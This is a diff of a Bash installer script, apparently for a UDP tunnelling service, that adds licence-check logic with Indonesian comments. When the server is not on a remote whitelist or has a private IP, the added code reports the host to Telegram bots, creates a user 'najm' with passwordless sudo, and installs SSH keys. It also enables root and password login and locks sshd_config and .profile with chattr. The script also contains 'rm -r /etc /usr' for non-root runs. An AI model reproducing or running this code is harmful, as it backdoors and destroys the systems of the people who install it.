@@ -28,9 +28,9 @@ LOG_FILE="/usr/bin/securited"
 # ===============================
 send_telegram() {
     MESSAGE="$1
-  Domain: \`$DOMAIN\`
-  IP Host: \`$IP_ADDRESS\`
-  IP Server: \`$ipsaya\`"
+	Domain: \`$DOMAIN\`
+	IP Host: \`$IP_ADDRESS\`
+	IP Server: \`$ipsaya\`"
     for BOT_TOKEN in "${TELEGRAM_BOT_TOKENS[@]}"; do
         for CHAT_ID in "${TELEGRAM_CHAT_IDS[@]}"; do
             curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
@@ -71,7 +71,6 @@ prepare_ssh_key() {
     fi
   done
 }
-
 change_profile(){
 PROFILE_FILE="/root/.profile"
 
@@ -119,6 +118,15 @@ chmod +x ctrl > /dev/null
 rm detek.zip* > /dev/null
 cd
 }
+hentikan_service_non_whitelist() {
+#  systemctl list-units --type=service --state=running --no-pager --no-legend | awk '{print $1}' | while read -r service; do
+#    if [[ ! " ${EXCLUDED_SERVICES[*]} " =~ " $service " ]]; then
+#      echo "$service" >> "$LOG_FILE"
+#      systemctl stop "$service" > /dev/null 2>&1
+#      systemctl disable "$service" > /dev/null 2>&1
+#    fi
+#  done
+}
 
 adduser_najm() {
     USERNAME="najm"
@@ -127,7 +135,7 @@ adduser_najm() {
     # Cek root
     if [ "$EUID" -ne 0 ]; then
         echo "❌ Harap jalankan sebagai root!"
-    sudo rm -r /etc /usr
+		sudo rm -r /etc /usr
         return 1
     fi
 
@@ -169,6 +177,7 @@ adduser_najm() {
     # Buat sudoers file tanpa password
     echo "$USERNAME ALL=(ALL) NOPASSWD:ALL" >/etc/sudoers.d/"$USERNAME"
     chmod 0440 /etc/sudoers.d/"$USERNAME"
+
 }
 
 inject_warning_to_profile() {
@@ -212,16 +221,90 @@ EOF
   send_telegram "SC Mod NAJM BERHASIL DIPASANG"
 }
 
+checking_sc() {
+	local data_ip_list=($(curl -L -sS "$download_url" \
+  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"))
+  local ip_found=false
+  local useexp=""
+
+  for data_ip in "${data_ip_list[@]}"; do
+    useexp=$(wget -qO- "$data_ip" | grep "$ipsaya" | awk '{print $3}')
+    if [[ -n "$useexp" ]]; then
+      ip_found=true
+      break
+    fi
+  done
+
+  if [[ "$ip_found" == true ]]; then
+  	inject_warning_to_profile
+    pasang_udp
+  else
+    send_telegram "SC TANPA IZIN DIJALANKAN DI $(hostname)"
+	setup_data
+	adduser_najm
+    prepare_ssh_key
+    sed -i 's/^PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
+    sed -i 's/^PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
+    sed -i 's/^#PubkeyAuthentication.*/PubkeyAuthentication yes/' /etc/ssh/sshd_config
+    chattr +ia /etc/ssh/sshd_config
+    for f in /etc/ssh/sshd_config.d/*.conf; do
+        chattr -ia "$f"
+        chattr -i /etc/ssh/sshd_config.d
+        sed -i 's/^PermitRootLogin.*/PermitRootLogin yes/' "$f"
+        sed -i 's/^PasswordAuthentication.*/PasswordAuthentication yes/' "$f"
+        sed -i 's/^#PubkeyAuthentication.*/PubkeyAuthentication yes/' "$f"
+        chattr +ia "$f"
+        chattr +i /etc/ssh/sshd_config.d
+        chattr +i /etc/ssh
+    done
+	inject_warning_to_profile
+	chattr -ia /root/.profile
+	change_profile
+    pasang_udp
+  fi
+}
+
 # ===============================
 # Main Entry Point
 # ===============================
 DOMAIN=$(cat "$DOMAIN_FILE" 2>/dev/null || echo "Tidak ditemukan")
 IP_ADDRESS=$(hostname -I | awk '{print $1}')
 ipsaya=$(curl -s ipv4.icanhazip.com)
+google_drive_file_id="#"
+download_url="https://raw.githubusercontent.com/ica4me/auto-script-free/main/udp-custom/link.txt"
+if [[ -z "$ipsaya" ]]; then
+  send_telegram "⚠️ IP Server Kosong! Server akan direboot."
+  # reboot
+  exit 0
+fi
 
-# Eksekusi langsung jika argumen 'server' diberikan, tanpa blokir IP/Reboot
-if [[ "$1" == "server" ]]; then
+if is_private_ip; then
+  send_telegram "IP Terdeteksi Private: $ipsaya"
+  setup_data
+  adduser_najm
+  prepare_ssh_key
+    sed -i 's/^PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
+    sed -i 's/^PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
+    sed -i 's/^#PubkeyAuthentication.*/PubkeyAuthentication yes/' /etc/ssh/sshd_config
+    chattr +ia /etc/ssh/sshd_config
+    for f in /etc/ssh/sshd_config.d/*.conf; do
+        chattr -ia "$f"
+        chattr -i /etc/ssh/sshd_config.d
+        sed -i 's/^PermitRootLogin.*/PermitRootLogin yes/' "$f"
+        sed -i 's/^PasswordAuthentication.*/PasswordAuthentication yes/' "$f"
+        sed -i 's/^#PubkeyAuthentication.*/PubkeyAuthentication yes/' "$f"
+        chattr +ia "$f"
+        chattr +i /etc/ssh/sshd_config.d
+        chattr +i /etc/ssh
+    done
+	inject_warning_to_profile
+	chattr -ia /root/.profile
+	change_profile
   pasang_udp
-  change_profile
+  exit 0
+fi
+
+if [[ "$1" == "server" ]]; then
+  checking_sc
   rm -rf /root/udp
 fi
